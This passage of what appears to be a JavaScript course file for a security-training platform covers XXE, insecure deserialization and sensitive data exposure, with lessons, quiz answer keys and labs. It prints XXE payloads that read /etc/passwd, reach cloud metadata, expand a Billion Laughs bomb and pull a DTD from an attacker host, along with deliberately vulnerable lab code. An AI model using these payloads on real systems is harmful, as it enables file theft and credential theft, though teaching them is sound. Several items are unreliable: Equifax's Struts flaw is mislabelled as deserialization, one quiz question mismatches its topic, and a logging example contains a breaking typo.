  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<data>&xxe;</data>
\`\`\`

When an insecure parser processes this, it reads the file and includes its contents in the response. This is XXE.

## Attack Vectors

### 1. Local File Disclosure

The most common XXE attack—reading files from the server:

\`\`\`xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root><data>&xxe;</data></root>
\`\`\`

**Impact:** Source code, configuration files, credentials, private keys.

### 2. Server-Side Request Forgery (SSRF via XXE)

XXE can be used to make the server perform requests to internal resources:

\`\`\`xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root><data>&xxe;</data></root>
\`\`\`

**Impact:** Access to cloud metadata, internal services, credential theft.

### 3. Billion Laughs Attack (DoS)

Also known as an XML bomb, this causes exponential memory expansion:

\`\`\`xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
]>
<lolz>&lol5;</lolz>
\`\`\`

A small document expands to gigabytes of memory, crashing the server.

### 4. Blind XXE

When error messages are suppressed, attackers use out-of-band (OOB) techniques to exfiltrate data:

\`\`\`xml
<!DOCTYPE root [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<root>&send;</root>
\`\`\`

## Case Files: Real-World Breaches

### Facebook XXE Vulnerability (2014)
**Impact:** Access to internal Facebook files

Security researcher Reginaldo Silva discovered that Facebook's "Forgot Password" feature parsed XML using a vulnerable parser. The researcher was able to:
1. Read files from Facebook's servers
2. Make requests to internal services
3. Potentially access sensitive credentials

Facebook awarded a $33,500 bug bounty—one of their largest at the time.

### XXE in SAML Implementations
**Impact:** Authentication bypass across enterprise applications

SAML (Security Assertion Markup Language) uses XML for single sign-on (SSO). Multiple SAML implementations have been vulnerable to XXE:
- OneLogin (2017)
- Duo Security
- Multiple ADFS implementations

Attackers could forge authentication tokens or extract secrets from identity providers.

### Microsoft Word XXE (2018)
**Impact:** Credential theft from corporate networks

Microsoft Word's DOCX format uses XML internally. Attackers sent malicious Word documents that, when opened, would:
1. Use XXE to connect to an attacker's SMB server
2. The victim's Windows system would send NTLM credentials
3. Attackers could crack or relay these credentials

## Defense Strategies

### 1. Disable DTD Processing Entirely

The safest option—completely disable DTD and external entity processing:

**JavaScript (node-xml2js):**
\`\`\`javascript
const parser = new xml2js.Parser({
  explicitEntities: false,
  entityExpansion: false
});
\`\`\`

**Java:**
\`\`\`java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
\`\`\`

**Python (defusedxml):**
\`\`\`python
import defusedxml.ElementTree as ET
tree = ET.parse('data.xml')  # Safe by default
\`\`\`

### 2. Disable External Entities Specifically

If you need DTDs but not external entities:

**Java:**
\`\`\`java
dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
\`\`\`

### 3. Use Safe XML Libraries

Choose libraries that are secure by default:
- **Python:** \`defusedxml\` instead of \`xml.etree\`
- **JavaScript:** \`fast-xml-parser\` with entity expansion disabled
- **Java:** Configure factories with security features enabled

### 4. Input Validation

Reject XML containing DTD declarations:

\`\`\`javascript
if (xmlInput.includes('<!DOCTYPE') || xmlInput.includes('<!ENTITY')) {
  throw new Error('DTD processing is not allowed');
}
\`\`\`

## Key Takeaways

1. **XXE exploits XML parser features**, not bugs—DTDs and external entities are "working as designed"
2. **Disable DTD processing** in production applications when possible
3. **Use secure-by-default libraries** like defusedxml (Python) or properly configured parsers
4. **Defense in depth**: Combine parser configuration with input validation
5. **Modern formats like JSON** don't have entity features and are inherently safer for data exchange
                `
            },
            {
                id: 'xxe-quiz-1',
                title: 'XXE Fundamentals Assessment',
                type: 'quiz',
                content: '',
                quiz: {
                    question: "What feature of XML does XXE exploit?",
                    options: [
                        "XML namespaces that allow cross-origin data access",
                        "External entity declarations in DTDs that reference files or URLs",
                        "XPath queries that can be injected like SQL",
                        "XML schema validation that exposes internal errors"
                    ],
                    correctAnswer: 1,
                    explanation: "XXE exploits the XML feature of external entities defined in DTDs. When a parser resolves an entity like <!ENTITY xxe SYSTEM 'file:///etc/passwd'>, it reads the file and includes its contents in the parsed document."
                }
            },
            {
                id: 'xxe-quiz-2',
                title: 'Attack Vector Recognition',
                type: 'quiz',
                content: '',
                quiz: {
                    question: "An attacker sends XML containing: <!ENTITY xxe SYSTEM 'http://169.254.169.254/latest/meta-data/'>. What attack is being attempted?",
                    options: [
                        "SQL Injection to access the database",
                        "XSS to inject malicious scripts",
                        "SSRF via XXE to access cloud metadata credentials",
                        "CSRF to forge authenticated requests"
                    ],
                    correctAnswer: 2,
                    explanation: "This is Server-Side Request Forgery (SSRF) performed via XXE. The attacker is using the XML parser to make a request to the AWS metadata endpoint (169.254.169.254), attempting to steal IAM credentials. XXE provides a vector for SSRF attacks."
                }
            },
            {
                id: 'xxe-quiz-3',
                title: 'Billion Laughs Analysis',
                type: 'quiz',
                content: '',
                quiz: {
                    question: "The 'Billion Laughs' attack (XML bomb) works by:",
                    options: [
                        "Sending a billion HTTP requests to overwhelm the server",
                        "Using nested entity definitions that expand exponentially in memory",
                        "Including malicious JavaScript that runs in an infinite loop",
                        "Exploiting buffer overflow in the XML parser code"
                    ],
                    correctAnswer: 1,
                    explanation: "The Billion Laughs attack defines entities that reference other entities in a nested pattern. When expanded, a few kilobytes of XML can consume gigabytes of memory: each 'lol' entity expands to 10 references, which each expand to 10 more, creating exponential growth."
                }
            },
            {
                id: 'xxe-quiz-4',
                title: 'Defense Strategy Evaluation',
                type: 'quiz',
                content: '',
                quiz: {
                    question: "Which is the MOST effective defense against XXE attacks?",
                    options: [
                        "Encoding XML special characters in input",
                        "Using HTTPS for all XML data transfers",
                        "Disabling DTD processing and external entity resolution in the parser",
                        "Validating XML against a strict schema"
                    ],
                    correctAnswer: 2,
                    explanation: "The most effective defense is to disable DTD processing entirely, or at minimum disable external entity resolution. This prevents the parser from ever attempting to resolve external references. Schema validation and encoding do not prevent XXE if the parser still resolves entities."
                }
            },
            {
                id: 'xxe-quiz-5',
                title: 'Real-World Breach Analysis',
                type: 'quiz',
                content: '',
                quiz: {
                    question: "In the 2014 Facebook XXE vulnerability discovered in their 'Forgot Password' feature, what made SAML implementations particularly susceptible to XXE?",
                    options: [
                        "SAML uses JSON which is vulnerable to entity expansion",
                        "SAML is an XML-based protocol, and many parsers processed DTDs by default",
                        "SAML passwords are stored in plaintext",
                        "SAML implementations use weak encryption"
                    ],
                    correctAnswer: 1,
                    explanation: "SAML (Security Assertion Markup Language) is XML-based by design. Many SAML implementations used XML parsers with default settings that processed DTDs and resolved external entities. Since SAML handles authentication, XXE vulnerabilities could lead to authentication bypass or credential theft."
                }
            },
            {
                id: 'xxe-lab',
                title: 'Secure the XML Parser',
                type: 'lab',
                content: 'The code below uses an XML parser with insecure default settings. Your mission: Configure the parser to disable external entity processing and DTD handling to prevent XXE attacks.',
                lab: {
                    initialCode: `
function parseUserXml(xmlInput) {
  // VULNERABLE: Parser uses insecure defaults
  const parser = new XMLParser({
    // No security configuration!
  });

  const result = parser.parse(xmlInput);
  return result;
}
                    `,
                    solutionCode: `
function parseUserXml(xmlInput) {
  // SECURE: Reject DTD declarations in input
  if (xmlInput.includes('<!DOCTYPE') || xmlInput.includes('<!ENTITY')) {
    throw new Error('DTD and entities are not allowed');
  }

  // SECURE: Configure parser to disable dangerous features
  const parser = new XMLParser({
    allowDtd: false,
    resolveExternalEntities: false,
    processEntities: false,
    expandEntityReferences: false
  });

  const result = parser.parse(xmlInput);
  return result;
}
                    `,
                    instructions: "Secure the XML parser against XXE:\n1. Add input validation to reject XML containing '<!DOCTYPE' or '<!ENTITY' (throw 'DTD and entities are not allowed')\n2. Configure the parser with these security options:\n   - allowDtd: false\n   - resolveExternalEntities: false\n   - processEntities: false\n   - expandEntityReferences: false"
                }
            }
        ]
    },
    {
        id: 'insecure-deserialization',
        title: 'Insecure Deserialization',
        description: 'Master the detection and prevention of deserialization attacks that can lead to remote code and system compromise.',
        difficulty: 'Advanced',
        xpReward: 450,
        locked: false,
        lessons: [
            {
                id: 'deser-theory',
                title: 'Understanding Deserialization Attacks',
                type: 'theory',
                content: `
# Insecure Deserialization

Insecure deserialization is a critical vulnerability that occurs when untrusted data is used to abuse the logic of an application, inflict a denial of service (DoS), or invoke arbitrary code. It consistently ranks among the most dangerous web vulnerabilities in the OWASP Top 10.

## Mission Briefing: What is Serialization?

Before understanding the attack, we need to understand serialization itself.

### Serialization

**Serialization** is the process of converting an object or data structure into a format that can be stored or transmitted. Think of it as "packaging" data for transport.

\`\`\`javascript
// JavaScript object
const user = { id: 1, name: "Agent007", role: "admin" };

// Serialized to JSON string
const serialized = JSON.stringify(user);
// Result: '{"id":1,"name":"Agent007","role":"admin"}'
\`\`\`

### Deserialization

**Deserialization** is the reverse—reconstructing the object from the serialized format:

\`\`\`javascript
// Deserialize JSON back to object
const user = JSON.parse(serialized);
// Result: { id: 1, name: "Agent007", role: "admin" }
\`\`\`

### The Problem: Native Serialization Formats

While JSON is relatively safe (it only supports basic data types), many languages have **native serialization formats** that can serialize *entire objects*, including their methods and internal state:

- **Java:** ObjectInputStream / ObjectOutputStream
- **PHP:** serialize() / unserialize()
- **Python:** pickle / cPickle
- **Ruby:** Marshal
- **.NET:** BinaryFormatter, SoapFormatter

These formats can reconstruct *callable objects*, not just data—and that is where the danger lies.

## Attack Vectors

### 1. Object Injection (PHP)

PHP's unserialize() can instantiate arbitrary classes and trigger magic methods. Attackers craft serialized payloads that set properties to malicious values, and when magic methods like __destruct() or __wakeup() run, they perform unintended actions.

### 2. Remote Code via Gadget Chains (Java)

Java deserialization attacks use "gadget chains"—sequences of existing classes that, when combined, lead to code invocation.

The most famous example involves **Apache Commons Collections**. The attacker never needs to upload code—they abuse classes *already in your classpath* to form a chain that invokes commands.

### 3. Type Confusion Attacks

Attackers manipulate the type information in serialized data to trigger unexpected code paths.

## Case Files: Real-World Breaches

### Equifax Breach (2017)
**Impact:** 147 million Americans' personal data exposed

The Equifax breach exploited a deserialization vulnerability in **Apache Struts** (CVE-2017-5638). The vulnerability allowed attackers to:
1. Send a crafted Content-Type header containing a serialized payload
2. The Struts framework deserialized the malicious object
3. This triggered remote code on Equifax servers
4. Attackers gained persistent access and exfiltrated data for months

The patch had been available for two months before the breach.

### Apache Commons Collections (2015)
**Impact:** Affected thousands of Java applications worldwide

Security researchers Gabriel Lawrence and Chris Frohoff published the "gadget chain" technique using Apache Commons Collections. This affected:
- WebLogic, WebSphere, JBoss (enterprise application servers)
- Jenkins (CI/CD)
- OpenNMS, Atlassian products
- Any Java application using the vulnerable library

### PayPal RCE (2015)
**Impact:** Full server compromise via Java deserialization

Researcher Mark Litchfield discovered that PayPal's Manager application was vulnerable to Java deserialization attacks.

## Understanding Gadget Chains

A **gadget chain** is a sequence of method calls triggered by deserialization that ultimately leads to a dangerous operation (usually code invocation).

Attackers do not need to introduce new code—they **chain together existing classes** in your application or libraries.

## Defense Strategies

### 1. Never Deserialize Untrusted Data

The safest approach is to avoid native serialization entirely for untrusted input. Use JSON instead.

### 2. Use Safe Data Formats

Prefer simple data-interchange formats:
- **JSON** (no callable code)
- **XML** (configure parser securely, see XXE module)
- **Protocol Buffers** (schema-defined, no arbitrary objects)
- **MessagePack** (binary JSON-like format)

### 3. Implement Type Allowlists

If you must use native serialization, restrict which classes can be deserialized.

### 4. Validate Before Deserializing

Check integrity and authenticity before processing using HMAC signatures.

### 5. Monitor and Patch Dependencies

Use tools to detect vulnerable libraries:
- **ysoserial** - Generate deserialization payloads for testing
- **OWASP Dependency-Check** - Scan for known vulnerabilities
- **Snyk** - Continuous vulnerability monitoring

## Key Takeaways

1. **Native serialization formats can invoke code** during deserialization
2. **Gadget chains** exploit existing classes—attackers need no code upload
3. **JSON is safer** because it only supports primitive data types
4. **Allowlisting classes** is essential if native serialization is unavoidable
5. **Sign and verify** serialized data to prevent tampering
6. **The Equifax breach** was a direct result of insecure deserialization
                `
            },
            {
                id: 'deser-quiz-1',
                title: 'Deserialization Fundamentals',
                type: 'quiz',
                content: '',
                quiz: {
                    question: "What makes native serialization formats (like Java's ObjectInputStream or Python's pickle) more dangerous than JSON?",
                    options: [
                        "They are slower to parse, allowing timing attacks",
                        "They can serialize and deserialize objects with methods, not just data",
                        "They do not support encryption",
                        "They are not compatible with web browsers"
                    ],
                    correctAnswer: 1,
                    explanation: "Native serialization formats can serialize entire objects including their methods and state. During deserialization, this can trigger code through magic methods (__destruct in PHP, __reduce__ in Python) or gadget chains. JSON only supports primitive data types (strings, numbers, arrays, objects) and cannot invoke code."
                }
            },
            {
                id: 'deser-quiz-2',
                title: 'Gadget Chain Analysis',
                type: 'quiz',
                content: '',
                quiz: {
                    question: "What is a 'gadget chain' in the context of deserialization attacks?",
                    options: [
                        "A hardware device used to intercept network traffic",
                        "A sequence of existing classes that, when combined during deserialization, leads to code invocation",
                        "A cryptographic key chain for encrypting serialized data",
                        "A debugging tool for tracing object creation"
                    ],
                    correctAnswer: 1,
                    explanation: "A gadget chain is a sequence of method calls triggered during deserialization that chains together existing classes (gadgets) in the application or its libraries. Attackers craft serialized payloads that, when deserialized, trigger this chain of calls ultimately leading to dangerous operations like invoking system commands."
                }
            },
            {
                id: 'deser-quiz-3',
                title: 'Real-World Breach Analysis',
                type: 'quiz',
                content: '',
                quiz: {
                    question: "The 2017 Equifax breach, which exposed 147 million Americans' data, was caused by:",
                    options: [
                        "SQL injection in the customer portal",
                        "An unpatched deserialization vulnerability in Apache Struts",
                        "Weak password policies for administrator accounts",
                        "A misconfigured firewall rule"
                    ],
                    correctAnswer: 1,
                    explanation: "The Equifax breach exploited CVE-2017-5638, a deserialization vulnerability in Apache Struts. Attackers sent crafted Content-Type headers containing malicious serialized payloads, achieving remote code access. The patch had been available for two months before the breach occurred."
                }
            },
            {
                id: 'deser-quiz-4',
                title: 'Defense Strategy Evaluation',
                type: 'quiz',
                content: '',
                quiz: {
                    question: "Which defense strategy provides the STRONGEST protection against insecure deserialization?",
                    options: [
                        "Encrypting serialized data before transmission",
                        "Avoiding native serialization entirely and using JSON for untrusted data",
                        "Compressing serialized data to hide the payload structure",
                        "Using HTTPS for all data transmission"
                    ],
                    correctAnswer: 1,
                    explanation: "The safest approach is to avoid native serialization formats entirely for untrusted data. JSON cannot invoke code during parsing—it only supports primitive data types. Encryption does not prevent deserialization attacks (the server must decrypt before deserializing). HTTPS protects data in transit but not against malicious payloads."
                }
            },
            {
                id: 'deser-quiz-5',
                title: 'Attack Vector Recognition',
                type: 'quiz',
                content: '',
                quiz: {
                    question: "A PHP application uses unserialize() on user-provided cookie data. An attacker could exploit this by:",
                    options: [
                        "Injecting SQL commands into the cookie value",
                        "Crafting a serialized payload that instantiates existing classes with malicious property values, triggering magic methods like __destruct() or __wakeup()",
                        "Overflowing the cookie buffer to inject shellcode",
                        "Using XSS to modify the cookie in the browser"
                    ],
                    correctAnswer: 1,
                    explanation: "PHP's unserialize() will instantiate objects defined in the serialized string. If the application has classes with dangerous magic methods (__destruct, __wakeup, __toString), attackers can craft payloads that set properties to malicious values. When these magic methods run, they perform unintended actions like file deletion, SQL queries, or command injection."
                }
            },
            {
                id: 'deser-lab',
                title: 'Implement Safe Deserialization',
                type: 'lab',
                content: 'The function below deserializes user session data using an unsafe method. Your mission: Replace the dangerous deserialization with a safe approach using JSON, type validation, and HMAC signature verification.',
                lab: {
                    initialCode: `
function loadSession(serializedData) {
  // VULNERABLE: Direct object construction from string
  // This could allow arbitrary code!
  const session = Function('return ' + serializedData)();

  return session;
}
                    `,
                    solutionCode: `
function loadSession(serializedData, signature, secretKey) {
  // SECURE: Verify HMAC signature first
  const expectedSignature = crypto
    .createHmac('sha256', secretKey)
    .update(serializedData)
    .digest('hex');

  if (signature !== expectedSignature) {
    throw new Error('Invalid signature');
  }

  // SECURE: Use JSON.parse instead of Function constructor
  const session = JSON.parse(serializedData);

  // SECURE: Validate expected types
  if (typeof session.userId !== 'string') {
    throw new Error('Invalid session format');
  }
  if (typeof session.role !== 'string') {
    throw new Error('Invalid session format');
  }

  // SECURE: Allowlist valid roles
  const allowedRoles = ['user', 'admin', 'moderator'];
  if (!allowedRoles.includes(session.role)) {
    throw new Error('Invalid role');
  }

  return session;
}
                    `,
                    instructions: "Secure the deserialization:\n1. Add signature and secretKey parameters to the function\n2. Verify HMAC signature using crypto.createHmac('sha256', secretKey) before parsing\n3. Throw 'Invalid signature' if verification fails\n4. Replace Function constructor with JSON.parse\n5. Validate that session.userId and session.role are strings (throw 'Invalid session format')\n6. Create an allowedRoles array with ['user', 'admin', 'moderator']\n7. Validate session.role is in allowedRoles (throw 'Invalid role')"
                }
            }
        ]
    },
    {
        id: 'sensitive-data-exposure',
        title: 'Sensitive Data Exposure',
        description: 'Learn how to protect passwords, PII, and secrets from exposure through proper encryption, hashing, and secure handling practices.',
        difficulty: 'Intermediate',
        xpReward: 350,
        locked: false,
        lessons: [
            {
                id: 'data-exposure-theory',
                title: 'The Art of Data Protection',
                type: 'theory',
                content: `
# Sensitive Data Exposure

Sensitive Data Exposure occurs when applications fail to adequately protect sensitive information such as financial data, healthcare records, credentials, and personally identifiable information (PII). This vulnerability consistently ranks among the most critical risks in the OWASP Top 10.

## Mission Briefing: What's at Stake

As a security operative, your mission is to protect three categories of classified data:

1. **Credentials** - Passwords, API keys, tokens, and secrets
2. **PII (Personally Identifiable Information)** - Names, SSNs, passport numbers, addresses
3. **Financial Data** - Credit card numbers, bank accounts, transaction records

When this data falls into enemy hands, the consequences are severe: identity theft, financial fraud, regulatory fines, and destroyed reputations.

## The Threat Landscape

### 1. Unencrypted Storage

Storing sensitive data in plaintext is like leaving classified documents on a park bench.

\`\`\`javascript
// VULNERABLE: Plaintext password storage
const user = {
  email: "agent@hq.gov",
  password: "TopSecret123!"  // Readable by anyone with DB access
};

db.users.insert(user);
\`\`\`

### 2. Weak Password Hashing

Using outdated hashing algorithms (MD5, SHA-1) or hashing without salt is nearly as bad as plaintext.

\`\`\`javascript
// VULNERABLE: MD5 is easily cracked
const hash = crypto.createHash('md5').update(password).digest('hex');

// VULNERABLE: No salt means identical passwords produce identical hashes
const hash = crypto.createHash('sha256').update(password).digest('hex');
\`\`\`

### 3. Exposed API Keys and Secrets

Hardcoded secrets in source code or configuration files committed to version control.

\`\`\`javascript
// VULNERABLE: Secret exposed in code
const API_KEY = "sk_live_abc123def456";  // Now in git history forever

// VULNERABLE: .env file committed to repository
// .env contents: DATABASE_URL=postgres://admin:password@prod-db:5432
\`\`\`

### 4. Logging Sensitive Data

Debug logs that capture passwords, credit cards, or personal information.

\`\`\`javascript
// VULNERABLE: Logging sensitive data
console.log("Login attempt:", { email, password });  // Password in logs!

// VULNERABLE: Request logging with PII
logger.info("Processing payment", { cardNumber, cvv, amount });
\`\`\`

### 5. Missing TLS/Encryption in Transit

Transmitting sensitive data over unencrypted connections allows interception.

\`\`\`javascript
// VULNERABLE: HTTP instead of HTTPS
fetch('http://api.example.com/auth', {
  body: JSON.stringify({ username, password })
});
\`\`\`

## Case Files: Real-World Breaches

### Marriott International (2018)
**Impact:** 500 million guest records exposed

Attackers accessed the Starwood reservation database for four years. The breach exposed:
- **Unencrypted passport numbers** for 5.25 million guests
- Credit card numbers (encrypted, but keys were also stolen)
- Names, addresses, phone numbers, email addresses

**Root Cause:** Sensitive PII stored without encryption. Passport numbers were in plaintext.

### Adobe Systems (2013)
**Impact:** 153 million user records

Adobe stored passwords using weak encryption (3DES in ECB mode with a single key for all users).

- Identical passwords produced identical ciphertexts
- Password hints stored in plaintext (revealed passwords like "my dog's name")
- The same encryption key was used for years

**Root Cause:** Encryption without proper password hashing; password hints exposed secrets.

### GitHub Secret Scanning (Ongoing)
**Impact:** Thousands of exposed credentials daily

GitHub's secret scanning detects millions of exposed credentials per year:
- AWS access keys
- Stripe API keys
- Database connection strings
- OAuth tokens

**Root Cause:** Developers accidentally commit secrets to public repositories.

## Defense Strategies

### 1. Hash Passwords with bcrypt or Argon2

\`\`\`javascript
// SECURE: bcrypt with automatic salting
const bcrypt = require('bcrypt');

async function hashPassword(password) {
  const saltRounds = 12;
  return bcrypt.hash(password, saltRounds);
}

async function verifyPassword(password, hash) {
  return bcrypt.compare(password, hash);
}
\`\`\`

### 2. Encrypt PII at Rest

\`\`\`javascript
// SECURE: AES-256-GCM encryption for PII
const crypto = require('crypto');

function encryptPII(data, key) {
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);

  let encrypted = cipher.update(data, 'utf8', 'hex');
  encrypted += cipher.final('hex');

  const authTag = cipher.getAuthTag();

  return { encrypted, iv: iv.toString('hex'), authTag: authTag.toString('hex') };
}
\`\`\`

### 3. Use Environment Variables for Secrets

\`\`\`javascript
// SECURE: Secrets from environment
const apiKey = process.env.API_KEY;
const dbPassword = process.env.DATABASE_PASSWORD;

// .gitignore must include .env files!
\`\`\`

### 4. Sanitize Logs

\`\`\`javascript
// SECURE: Redact sensitive fields before logging
function sanitizeForLogging(data) {
  const sanitized = { ...data };

  const sensitiveFields = ['password', 'ssn', 'cardNumber', 'cvv', 'apiKey'];

  for (const field of sensitiveFields) {
    if (sensitized[field]) {
      sanitized[field] = '[REDACTED]';
    }
  }

  return sanitized;
}

logger.info("User login", sanitizeForLogging({ email, password }));
// Output: { email: "user@example.com", password: "[REDACTED]" }
\`\`\`

### 5. Enforce HTTPS Everywhere

\`\`\`javascript
// SECURE: HTTPS enforcement in Express
app.use((req, res, next) => {
  if (!req.secure && req.headers['x-forwarded-proto'] !== 'https') {
    return res.redirect(\`https://\${req.headers.host}\${req.url}\`);
  }
  next();
});

// Add HSTS header
app.use((req, res, next) => {
  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
  next();
});
\`\`\`

## Key Takeaways

1. **Never store passwords in plaintext** - Use bcrypt or Argon2 with proper salt rounds
2. **Encrypt PII at rest** - Use AES-256-GCM for data like SSNs and passport numbers
3. **Keep secrets out of code** - Use environment variables and secret managers
4. **Sanitize all logs** - Remove sensitive data before logging
5. **Enforce TLS everywhere** - HTTPS for all data in transit
6. **Assume breach** - Encrypt data so it's useless when stolen
                `
            },
            {
                id: 'data-exposure-quiz-1',
                title: 'Password Storage Assessment',
                type: 'quiz',
                content: '',
                quiz: {
                    question: "Which password storage method provides the STRONGEST protection against offline attacks?",
                    options: [
                        "MD5 hashing",
                        "SHA-256 hashing without salt",
                        "AES-256 encryption with a server key",
                        "bcrypt with a work factor of 12"
                    ],
                    correctAnswer: 3,
                    explanation: "bcrypt is specifically designed for password hashing. It automatically handles salting, and the work factor (cost) makes brute-force attacks computationally expensive. MD5 and unsalted SHA-256 are fast to compute, making them vulnerable to rainbow tables and brute-force. AES encryption requires key management and is reversible, unlike proper hashing."
                }
            },
            {
                id: 'data-exposure-quiz-2',
                title: 'Breach Analysis: Marriott',
                type: 'quiz',
                content: '',
                quiz: {
                    question: "In the 2018 Marriott breach, what critical mistake led to 5.25 million passport numbers being exposed in readable form?",
                    options: [
                        "The passport numbers were encrypted but attackers stole the decryption key",
                        "The passport numbers were stored in plaintext without encryption",
                        "The database used weak password protection",
                        "The passport images were accessible via direct URL"
                    ],
                    correctAnswer: 1,
                    explanation: "Marriott stored passport numbers in plaintext without any encryption. While credit card numbers were encrypted (though attackers may have obtained the keys), passport numbers had no cryptographic protection at all. This is a textbook case of sensitive data exposure through lack of encryption at rest."
                }
            },
            {
                id: 'data-exposure-quiz-3',
                title: 'Breach Analysis: Adobe',
                type: 'quiz',
                content: '',
                quiz: {
                    question: "Adobe's 2013 breach exposed 153 million passwords. What was the fundamental flaw in their password storage that allowed attackers to crack many passwords?",
                    options: [
                        "They stored passwords in plaintext",
                        "They used encryption (not hashing) with a single key, so identical passwords produced identical ciphertexts",
                        "They used MD5 without salt",
                        "They stored passwords in a spreadsheet"
                    ],
                    correctAnswer: 1,
                    explanation: "Adobe used 3DES encryption in ECB mode with a single key for ALL users. This meant identical passwords produced identical ciphertexts. Attackers could identify common passwords by frequency analysis. Additionally, password hints were stored in plaintext, often revealing the actual passwords. The correct approach is to use a proper password hashing algorithm (bcrypt/Argon2) which produces unique hashes even for identical passwords."
                }
            },
            {
                id: 'data-exposure-quiz-4',
                title: 'Secret Management',
                type: 'quiz',
                content: '',
                quiz: {
                    question: "A developer accidentally commits an AWS access key to a public GitHub repository. What is the FIRST action they should take?",
                    options: [
                        "Delete the commit from the repository history",
                        "Make the repository private",
                        "Rotate (revoke and regenerate) the exposed credentials immediately",
                        "Contact AWS support to report the exposure"
                    ],
                    correctAnswer: 2,
                    explanation: "The FIRST priority is to rotate (revoke) the exposed credentials immediately. Automated scanners continuously scan GitHub for exposed secrets and can exploit them within minutes. Deleting from git history does not help because the secret was already pushed and may have been cached or cloned. Making the repo private does not revoke existing credentials. Always assume a committed secret has been compromised."
                }
            },
            {
                id: 'data-exposure-quiz-5',
                title: 'Logging Best Practices',
                type: 'quiz',
                content: '',
                quiz: {
                    question: "Which of the following logging statements creates the MOST serious security risk?",
                    options: [
                        "logger.info('User logged in', { userId: user.id, timestamp: Date.now() })",
                        "logger.error('Login failed', { email: req.body.email, password: req.body.password })",
                        "logger.debug('Request received', { path: req.path, method: req.method })",
                        "logger.warn('Rate limit exceeded', { ip: req.ip, endpoint: req.path })"
                    ],
                    correctAnswer: 1,
                    explanation: "Logging the password creates a severe security risk. Passwords in logs can be exposed through log aggregation services, log files on disk, error reporting tools, or team members with log access. Even if hashed before storage, logging the raw password defeats the purpose of hashing. Sensitive data like passwords, credit cards, and SSNs should NEVER appear in logs."
                }
            },
            {
                id: 'data-exposure-lab',
                title: 'Secure the User Data Handler',
                type: 'lab',
                content: 'The code below handles user registration but has multiple sensitive data exposure vulnerabilities: plaintext password storage, logging sensitive data, and unprotected PII. Your mission: Fix all vulnerabilities by implementing proper password hashing, log sanitization, and PII encryption.',
                lab: {
                    initialCode: `
async function registerUser(userData) {
  const { email, password, ssn, name } = userData;

  // VULNERABLE: Logging sensitive data
  console.log("Registering user:", { email, password, ssn });

  // VULNERABLE: Storing password in plaintext
  const user = {
    email,
    password: password,  // Plaintext!
    ssn: ssn,            // Unencrypted PII!
    name
  };

  await db.users.insert(user);

  return { success: true, userId: user.id };
}
                    `,
                    solutionCode: `
async function registerUser(userData) {
  const { email, password, ssn, name } = userData;

  // SECURE: Sanitize logs - remove sensitive data
  console.log("Registering user:", { email, password: '[REDACTED]', ssn: '[REDACTED]' });

  // SECURE: Hash password with bcrypt
  const hashedPassword = await bcrypt.hash(password, 12);

  // SECURE: Encrypt PII with AES-256
  const encryptedSSN = encrypt(ssn, process.env.ENCRYPTION_KEY);

  const user = {
    email,
    password: hashedPassword,
    ssn: encryptedSSN,
    name
  };

  await db.users.insert(user);

  return { success: true, userId: user.id };
}
                    `,
                    instructions: "Fix the sensitive data exposure vulnerabilities:\n1. Sanitize the log statement by replacing password and ssn values with '[REDACTED]'\n2. Hash the password using bcrypt.hash(password, 12) and store as hashedPassword\n3. Encrypt the SSN using encrypt(ssn, process.env.ENCRYPTION_KEY) and store as encryptedSSN\n4. Update the user object to use hashedPassword and encryptedSSN instead of plaintext values"
                }
            }
        ]
    }
];
